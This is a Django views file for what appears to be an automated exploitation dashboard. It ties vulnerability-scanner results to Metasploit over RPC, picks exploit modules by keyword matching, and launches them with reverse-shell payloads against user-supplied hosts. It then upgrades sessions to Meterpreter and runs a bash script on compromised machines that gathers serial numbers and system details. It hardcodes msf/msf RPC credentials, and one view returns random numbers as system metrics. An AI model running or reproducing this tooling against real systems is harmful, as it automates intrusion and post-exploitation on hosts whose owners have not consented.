from nltk.corpus import stopwords
import GVM.GVM.gvm as gvm
import json
import random
import re
import subprocess
from django.shortcuts import render
from django.views import View
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from django.template import loader
from django.http import HttpResponse, JsonResponse, HttpResponseRedirect
from django import template
from pymetasploit3.msfrpc import MsfRpcClient
import xml.etree.ElementTree as ET
import time
import threading
import re
from collections import Counter
from Users.models import User
from .models import Exploit
from collections import Counter
from nltk.tokenize import word_tokenize
import nltk
from nltk.corpus import stopwords
import re

# stop_words = set(stopwords.words('english'))
msf_user = 'msf'
msf_pass = 'msf'
msf_host = '127.0.0.1'
msf_port = 55552
# Khởi tạo đối tượng MsfRpcClient
client = MsfRpcClient(msf_pass, port=msf_port,
                      username=msf_user, server=msf_host)

host = ""
# Create your views here.


def exploit(module, payload, rhost, rport, uri, lhost, lport):
    subprocess.run(["python", "./Core/tools/send_data.py", host,
                   "start attack"], capture_output=True, text=True)
    console = client.consoles.console()
    console.read()
    console.write("use " + module)
    subprocess.run(["python", "./Core/tools/send_data.py", host,
                   console.read()['data']], capture_output=True, text=True)

    time.sleep(2)
    console.write("set payload " + payload)
    subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                   text=True)

    if lhost != None:
        console.write("set lhost " + lhost)
        subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                       text=True)

    if lport != None:
        console.write("set lport " + lport)
        subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                       text=True)

    if uri is None:
        console.write("use " + module)
        subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                       text=True)

        console.write("set rhosts " + rhost)
        subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                       text=True)

        if rport != None:
            console.write("set rport " + rport)
            subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                           text=True)
    else:
        console.write("set uri " + uri)
        subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True,
                       text=True)

    console.write('exploit -j')
    while True:
        output = console.read()['data']
        if output != "":
            subprocess.run(["python", "./Core/tools/send_data.py", host, output], capture_output=True,
                           text=True)
        if "Exploit completed" in output:
            subprocess.run(["python", "./Core/tools/send_data.py", host, output], capture_output=True,
                           text=True)
            break
        if "Command shell session" in output:
            subprocess.run(["python", "./Core/tools/send_data.py", host, output], capture_output=True,
                           text=True)
            break


def extract_keywords(text):
    words = nltk.word_tokenize(text)
    stop_words = set(stopwords.words('english'))
    keywords = [word for word in words if word.lower() not in stop_words]
    # Thêm vào đoạn mã này để bao gồm các từ như "dRuby" và "DRb"
    additional_keywords = re.findall(
        r'\b(?:[a-z]+[A-Z]|[A-Z]+[a-z])[a-zA-Z0-9]*\b', text)
    return additional_keywords


class Auto(View):
    def get(self, request, id1, **kwargs):
        vuln = gvm.get_result(id=id1)
        et = ET.fromstring(vuln).find("result")
        name = et.find('name').text
        host = request.get_host()
        username = request.user.username

        search_term = extract_keywords(name)
        print(search_term)
        search_results = []
        for child in search_term:
            results = client.call('module.search', [child])
            results = [str(child) for child in results]
            search_results.extend(results)
        counter = Counter(list(search_results))
        result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
        print(result[0])
        results = [eval(child[0]) for child in result[0:10] if child[1]==result[0][1]]
        exploits = [child["fullname"] for child in results]
        exploits.insert(0, '')
        host = et.find('host').text
        return render(request, "dashboard/auto.html", {"username": username, "exploits": exploits, 'host':host})


class Main(View):
    def get(self, request, **kwargs):
        host = request.get_host()
        username = request.user.username
        module = Exploit.objects.all()
        exploits = client.modules.exploits
        exploits.insert(0, '')

        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})

    def post(self, request, **kwargs):
        host = request.POST['ip']
        module = request.POST['exploit']
        payload = request.POST['payload']
        rport = request.POST.get('rport', None)
        lhost = request.POST.get('lhost', None)
        lport = request.POST.get('lport', None)
        uri = request.POST.get('uri', None)
        threading.Thread(target=exploit(module=module, payload=payload,
                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport)).start()

        username = request.user.username
        exploits = client.modules.exploits
        exploits.insert(0, '')
        # return HttpResponse("hello")
        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})


def run_session(session):
    cid = client.consoles.console().cid
    console = client.consoles.console(cid)
    st = threading.Thread(target=console.write("sessions -i " + str(session)))
    st.start()
    timeout = time.time() + 10
    while True:
        data = console.read()
        time.sleep(0.2)
        if "Invalid session identifier" in data['data']:
            return None, data['data'], None
        if time.time() > timeout:
            return None, "Time out", None
        if ("Starting interaction with") in data['data']:
            return console, data['data'], cid


consoles = []
for session in client.sessions.list:
    console, data, cid = run_session(session)
    consoles.append(console)


def run_command(console, cmd):
    console.write(cmd)
    timeout = time.time() + 2
    while True:
        time.sleep(0.3)
        output = console.read()
        if output['data'] != "":
            print(output)
            return output
        if time.time() > timeout:
            return output


def console():
    return client.consoles.console()


class LoadSessions(View):
    def get(self, request):
        # threading.Thread(target=exploit(module='exploit/linux/misc/drb_remote_codeexec', payload="cmd/unix/reverse_python", rhost="192.168.1.25",rport=None, lport=None, lhost=None, uri=None)).run()
        sessions = {"sessions": client.sessions.list}
        # sessions = {"sessions": [{'name':"name", 'host':"127.0.0.1"},{'host':"1.1.1.1"}]}
        # sessions={"id":100}
        return JsonResponse(sessions)


class LoadPayloads(View):
    def get(self, request):
        payloads = {}
        return JsonResponse(payloads)


class LoadSessionId(View):

    system_info = """readarray -t array <<< "$(df -h)";
var=$(echo "${array[1]}"| grep -aob '%' | grep -oE '[0-9]+');
df_output="${array[3]:$var-3:4}";

manufacturer=$(cat /sys/class/dmi/id/chassis_vendor);
product_name=$(cat /sys/class/dmi/id/product_name);
version=$(cat /sys/class/dmi/id/bios_version);
serial_number=$(cat /sys/class/dmi/id/product_serial);
hostname=$(hostname);
operating_system=$(hostnamectl | grep "Operating System" | cut -d ' ' -f3-);
processor_name=$(awk -F':' '/^model name/ {print $2}' /proc/cpuinfo | uniq | sed -e 's/^[ \t]*//');
memory=$(dmidecode -t 17 | grep "Size" | awk '{s+=$2} {b=$3} END {print s b}');



printf '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":"%s","hostname":"%s","operating_system":"%s","processor_name":"%s","memory":"%s"}' "$manufacturer" "$product_name" "$version" "$serial_number" "$hostname" "$operating_system" "$processor_name" "$memory"
"""

    def byte_to_json(self, output):
        try:
            return json.loads(output.decode('utf8'))
        except:
            return b"{}"
            raise

    def get(self, request, id):
        ip = client.sessions.list[str(id)]['session_host']
        network = []
        system = {}
        try:
            console, data, cid = run_session(int(id))
            data = run_command(console, "ip addr")['data']
            network = re.split(r'\n[0-9]:', data)
            system = run_command(console, self.system_info)
            system = system['data'].split('\n')[-1]
            if system == "":
                system = "{}"
            # console.write("background")
            # console.read()

            system = json.loads(system)
            console.write("background")
            del console
        except Exception as e:
            print(e)
            pass

        # # get_system_info = Info.connection_bash_execute(file=self.system_info, ip=ip)
        # get_disk_info = Info.connection_ssh_execute(command="lsblk --json", ip=ip)
        # get_network_info = Info.connection_ssh_execute(command="ip --json address", ip=ip)
        # get_systemctl = Info.connection_ssh_execute(
        #     command="systemctl list-units --type=service --state=active -o json", ip=ip)
        #
        # # get_system_info_json = self.byte_to_json(get_system_info)
        # get_system_disk_json = self.byte_to_json(get_disk_info)
        # get_system_network_json = self.byte_to_json(get_network_info)
        # get_systemctl_list_json = self.byte_to_json(get_systemctl)
        session = client.sessions.list[str(id)]
        return render(request, 'client/clientinfo.html', {'id': id, 'ip': ip, 'system_network': network, 'client_info': system, 'session': session})


class Msf(View):
    def get(self, request, id):
        ids = {'id': id}
        return render(request, 'dashboard/msf.html', ids)


class Module(View):
    def get(self, request):
        module = request.GET['module']
        payloads = client.modules.use('exploit', module).payloads
        payloads = {'payloads': payloads}
        return JsonResponse(payloads)


class Message(View):
    def get(self, request):
        return render(request, 'dashboard/message.html')


class Meterpreter(View):
    def get(self, request, id):
        console = client.consoles.console()
        console.read()
        console.write("use post/multi/manage/shell_to_meterpreter")
        time.sleep(0.5)
        console.write("set SESSION "+str(id))
        console.write("run")
        time.sleep(5)
        print(console.read())
        return HttpResponseRedirect("/oprs/")


class Info(View):
    def get(self, request, ip):
        return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})

    def post(self, request, ip):
        try:
            return JsonResponse(
                {'ram': random.randint(3, 9), 'cpu': random.randint(3, 9), 'disk': random.randint(3, 9)})
        except Exception as e:
            print(e)
            return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})
